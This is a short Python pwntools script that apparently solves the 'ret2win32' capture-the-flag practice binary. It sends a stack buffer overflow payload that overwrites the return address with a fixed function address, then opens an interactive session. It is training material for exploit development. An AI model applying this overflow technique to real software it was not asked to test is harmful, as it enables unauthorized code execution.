from pwn import gdb, process, p32   # type: ignore

'''target = gdb.debug(
    "./ret2win32",
    gdbscript="b *0x0804862a"
)'''
target = process("./ret2win32")

payload = b''
payload += b'A' * 0x20
payload += b'B' * 0xC
#payload += b'C' * 0x4
payload += p32(0x0804862c)
target.sendline(payload)
target.interactive()
